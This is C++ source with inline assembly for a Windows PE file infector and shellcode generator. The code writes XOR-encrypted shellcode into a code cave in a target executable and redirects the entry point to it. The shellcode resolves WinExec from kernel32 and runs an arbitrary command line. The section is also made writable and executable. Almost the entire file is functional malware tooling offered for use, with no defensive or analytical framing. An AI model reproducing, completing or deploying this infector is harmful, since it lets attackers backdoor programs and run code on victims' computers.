/* 
   The simple EPO-like infector and shellcode generator 
               (c) by Azizjon Mamashoev
*/

#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <time.h>

//Mr.Buggers, превед!
#include "zdisasm.h"

#define getrandom( min, max ) ((rand() % (int)(((max) + 1) - (min))) + (min))

#define XOR_OFFSET  		0x1a
#define XOR_CONST_OFFSET	0x0a
#define	END_CONST			0xb5b0

#define ASM_CALL			0xe8
#define ASM_JMP				0xe9
#define ASM_NOP				0x90
#define	SIZEOFJUMP			0x05	

#define RWE_FLAGS			0xe0000020

DWORD sc_size; 

__declspec(naked) void sc(void)
{
	__asm 
	{
        call    reloc

	reloc:
        pop     eax
        add     eax,0x15
        mov     cl,0x06

	unxor:
		mov     bx,[eax]
        cmp     bx,END_CONST
        je      begin
        xor     [eax],cl
        inc     eax
        jmp     unxor

	begin:
        jmp     fname

    one:
        pop     esi
        mov     ecx,0x7
        call    find_kernel32
        call    getapi
        jmp     exename

    two:
        pop     eax
        push    0
        push    eax
        call    edx
        ret

	getapi:
        mov     ebx,eax
        add     ebx,[eax+0x3C]
        add     ebx,0x78
        mov     ebx,[ebx]
        add     ebx,eax
        mov     edx,[ebx+20h]
        add     edx,eax
        push    ebx
        xor     ebx,ebx

    getapi_4:
        push    esi
        push    ecx
        mov     edi,[edx]
        add     edi,eax
        repe    cmpsb
        je      getapi_3
        pop     ecx
        pop     esi
        add     edx,4
        inc     ebx
        jmp     getapi_4

    getapi_3:
        pop     ecx
        pop     ecx
        pop     ecx
        shl     ebx,1
        mov     edx,[ecx+24h]
        add     edx,eax
        add     edx,ebx
        mov     edx,[edx]
        and     edx,0FFFFh
        mov     ebx,[ecx+1Ch]
        add     ebx,eax
        shl     edx,2
        add     ebx,edx
        mov     edx,[ebx]
        add     edx,eax
        ret

    find_kernel32:
        push    esi
        xor     eax,eax
        mov     eax,fs:[eax+0x30]
        test    eax,eax
        js      find_kernel32_9x
        mov     eax,[eax+0x0c]
        mov     esi,[eax+0x1c]
        lodsd
        mov     eax,[eax+0x8]
        jmp     find_kernel32_finished

    find_kernel32_9x:
        mov     eax,[eax+0x34]
        lea     eax,[eax+0x7c]
        mov     eax,[eax+0x3c]

    find_kernel32_finished:
        pop     esi
        ret    

	fname:
        call    one

		__emit 'W'
		__emit 'i'
		__emit 'n'
		__emit 'E'
		__emit 'x'
		__emit 'e'
		__emit 'c'
		__emit 0

    exename:
        call    two
	}
}

__declspec(naked) void sc_end(void)
{

}

void crypt(PBYTE pbBuff)
{
	BYTE cnst = getrandom(0xc0, 0xdf);
	
	*(pbBuff + XOR_CONST_OFFSET) = cnst;
	pbBuff += XOR_OFFSET;

	while (true)
	{
		if (*(WORD*)(pbBuff) == END_CONST)
			break;

		*pbBuff ^= cnst;
		pbBuff++;
	}
}

int mk_shellcode(PBYTE pbBuff, PCHAR exename)
{
	int namelen = min(strlen(exename), MAX_PATH) + 1;
	int len = sc_size;

	memcpy(pbBuff, (PBYTE)sc, sc_size);
	memcpy(pbBuff + len, exename, namelen);
	
	len += namelen;
	*(WORD*)(pbBuff + len) = END_CONST;
	len += sizeof(WORD);

	crypt(pbBuff);

	return len;
}

void InsertByte(DWORD Addr, unsigned char Byte)
{
	if(!IsBadReadPtr((void*)Addr, (UINT) sizeof(byte)))
		*((byte*) ((DWORD*)Addr)) = Byte;
}

void InsertDword(DWORD Addr, DWORD dWord)
{
	if(!IsBadReadPtr((void*)Addr, (UINT) sizeof(DWORD)))
		*((DWORD*)Addr) = dWord;
}

void GenJmp(DWORD To, DWORD From)
{
	InsertByte (From+0, ASM_JMP);		// jmp	...
	InsertDword(From+1, To - From - 5); // dst - src - 5
}

void GenCall(DWORD To, DWORD From)
{
	InsertByte (From+0, ASM_CALL);		// jmp	...
	InsertDword(From+1, To - From - 5); // dst - src - 5
}

void infect(PBYTE pbFile, DWORD dwSize, PBYTE pbSc)
{
	DWORD dwVOffset = 0, dwROffset = 0, dwRSize = 0;

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)
		(pbFile + ((PIMAGE_DOS_HEADER)pbFile)->e_lfanew);

	DWORD ep = pImageNtHeaders->OptionalHeader.AddressOfEntryPoint;

	PIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)
			(pImageNtHeaders->FileHeader.SizeOfOptionalHeader + 
			(long)&(pImageNtHeaders->OptionalHeader));
	
	printf("EntryPoint at : 0x%.8x\n", ep);
	printf("ImageSectionHeader at offset: 0x%.8x\n", 
		(PBYTE)pImageSectionHeader-pbFile);

	for (int i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
	{
		// find section .text	
		if(!strncmp((char *)pImageSectionHeader->Name, ".text", 5))
		{
			
			dwVOffset = pImageSectionHeader->VirtualAddress;
			dwROffset = pImageSectionHeader->PointerToRawData;
			dwRSize = pImageSectionHeader->SizeOfRawData;
			break;
		}

		pImageSectionHeader++;
	}

	if (dwVOffset == 0 || dwROffset == 0 || dwRSize == 0)
	{
		printf("Section .text not found\n");
		return;
	}

	printf("Section .text found\n");
	printf("VOffset : 0x%.8x ROffset : 0x%.8x RSize : 0x%.8x\n",
		dwVOffset, dwROffset, dwRSize);
	
	// EntryPointOffset = AddressOfEntryPoint - VOffset + ROffset
	ep += dwROffset - dwVOffset;

	if (*(PBYTE)(pbFile + ep) == ASM_JMP)
	{
		printf("Damn, it seems to bee allready infected...\n");
		return;
	}

	DWORD dwFound = 0, dwEvilOffset = 0;
	PBYTE pbCode = pbFile + dwROffset;
	// find free space 4 shellcode
	while (pbCode < pbFile + dwROffset + dwRSize)
	{
		if (*pbCode == 0x00)
		{
			if (dwEvilOffset == 0)
				dwEvilOffset = (DWORD)pbCode;
			dwFound++;
		} else { 
			dwFound = 0;
			dwEvilOffset = 0;
		}

		if (dwFound >= dwSize + 20)
		{
			break;
		}

		pbCode++;
	}

	if (dwFound < dwSize || dwEvilOffset == 0)
	{		
		printf("%d zero bytes not found in this section\n", dwSize);
		return;
	}

	dwEvilOffset += 16 - dwEvilOffset % 16;
	printf("%d zero bytes found at offset 0x%.8x\n", 
		dwFound, dwEvilOffset - (DWORD)pbFile);
	// copy shellcode
	memcpy((PVOID)dwEvilOffset, pbSc, dwSize);
	
	printf("EntryPoint offset : 0x%.8x\n", ep);

	pbCode = pbFile + ep;
	dwFound = 0;
	DWORD dSize = 0;
    while(dwFound < SIZEOFJUMP)
    {
		GetInstLenght((DWORD*)pbCode, &dSize);
		pbCode += dSize;
		dwFound += dSize;
    }

	printf("%d bytes moved\n", dwFound);

	// make loader
	GenCall(dwEvilOffset, dwEvilOffset + dwSize);
	dwEvilOffset += dwSize;
	memcpy((PVOID)(dwEvilOffset + SIZEOFJUMP), pbFile + ep, dwFound);
	GenJmp((DWORD)pbCode, dwEvilOffset + SIZEOFJUMP + dwFound);

	// generate jump from EntryPoint to shellcode
	GenJmp(dwEvilOffset, (DWORD)pbFile + ep);

	// set RWE attributes to code section
	// it need to decrypt shellcode
	pImageSectionHeader->Characteristics = RWE_FLAGS;
}

BOOL InfectFile(char *FileName, char *cmdline)
{
	char OldFile[MAX_PATH];

	strncpy(OldFile, FileName, sizeof(OldFile));
	strcat(OldFile, ".bak");

	DeleteFile(OldFile);

	if (!MoveFile(FileName, OldFile))
	{
		printf("MoveFile(%s, %s) : error %d\n", FileName, OldFile, GetLastError());
		return FALSE;
	}

	if (!CopyFile(OldFile, FileName, FALSE))
	{
		printf("CopyFile(%s, %s) : error %d\n", OldFile, FileName, GetLastError());
		return FALSE;
	}

	HANDLE hTargetFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, 
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTargetFile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile() : error %d\n", GetLastError());
		return FALSE;
	}

	HANDLE hFileMapping = CreateFileMapping(hTargetFile, 
		NULL, PAGE_READWRITE, 0, 0, NULL);
	
	PBYTE pbFile = (PBYTE)MapViewOfFile(hFileMapping, FILE_MAP_WRITE, 0, 0, 0);

	sc_size = (DWORD)((int)&sc_end - (int)&sc - 11);

	PBYTE pbBuff = (PBYTE)VirtualAlloc(NULL, sc_size + 100, 
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ZeroMemory(pbBuff, sc_size + 100);

	int len = mk_shellcode(pbBuff, cmdline);
	infect(pbFile, len, pbBuff);

	UnmapViewOfFile(pbFile);
	VirtualFree(pbBuff, sc_size + 100, MEM_RELEASE);
	CloseHandle(hFileMapping);
	CloseHandle(hTargetFile); 

	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	srand((unsigned)time(NULL)); 

	if (argc != 2)
	{
		printf("ussage: infector.exe <file2infect> <cmdline>\n");
		return 0;
	}

	InfectFile(argv[1], argv[2]);

	return 0;
}
